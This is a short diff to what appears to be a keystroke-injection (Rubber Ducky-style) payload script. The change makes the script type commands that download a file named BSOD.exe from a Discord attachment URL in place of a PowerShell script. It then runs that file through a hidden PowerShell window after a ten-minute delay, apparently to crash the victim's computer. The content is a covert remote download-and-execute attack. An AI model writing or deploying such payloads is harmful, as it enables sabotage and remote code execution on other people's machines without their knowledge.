@@ -16,10 +16,10 @@ STRING cd bsod
 DELAY 150
 ENTER
 DELAY 150
-STRING curl https://cdn.discordapp.com/attachments/1069171881275568189/1075343857480388608/Invoke-BSOD.ps1 -o Invoke-BSOD.ps1
+STRING curl https://cdn.discordapp.com/attachments/1069171881275568189/1075370708944818227/BSOD.exe -o BSOD.exe
 DELAY 150
 ENTER
 DELAY 150
-STRING powershell -WindowStyle Hidden -Command timeout 600; .\Invoke-BSOD.ps1
+STRING powershell -WindowStyle Hidden -Command timeout 600; .\BSOD.exe
 DELAY 150
 ENTER
